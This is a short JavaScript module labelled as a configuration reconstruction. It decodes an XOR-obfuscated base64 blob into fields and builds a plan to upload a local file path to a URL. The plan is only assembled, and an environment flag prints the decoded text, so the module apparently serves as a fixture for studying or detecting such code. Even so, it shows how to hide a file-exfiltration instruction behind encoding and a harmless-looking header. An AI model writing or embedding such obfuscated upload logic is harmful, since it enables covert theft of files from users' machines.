// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_6cd4fa62 = "QwgESUZBUEVGCEdQVFFqU1xZUBlBR1RbRlhcQWpHUFhaQVBJVFFURUFQRwhGQUdQVFhqRVxFUFlcW1BJRkFUUlBqVlpAW0EIBElWVFhFVFxSW2pcUQh7enFwGHcHBgUABHZ2SUBHWQhdQUFFRg8aGltaUVAYVwcGBQAEVlYNVlFUG1BNVFhFWVAbXFtDVFlcURpURVxJQEZQR2pUUlBbQQh7WlFQdEBRXEEaVwcGBUlTXFlQakVUQV0IGkFYRRpdQFtBR1BGRhhbWlFQGhtGQVRSUBhXBwYFAARWVg1WUVQbWF9G";
const Codec_6cd4fa62 = "base64_chunks|single_byte_xor|35";

function load_6cd4fa62() { return [...Buffer.from(Material_6cd4fa62, "base64")]; }
function decode_6cd4fa62(storedBytes) { return storedBytes.map((value) => value ^ 53); }
async function recover_6cd4fa62() {
  const harmlessValue = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const storedBytes = load_6cd4fa62(); let recoveredBytes = [];
  recoveredBytes = decode_6cd4fa62(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_6cd4fa62() { return Buffer.from(await recover_6cd4fa62(), "utf8").toString("utf8"); }
async function plan_6cd4fa62() { const inspect = inspect_6cd4fa62; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_6cd4fa62;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_6cd4fa62());

// reconstruction complete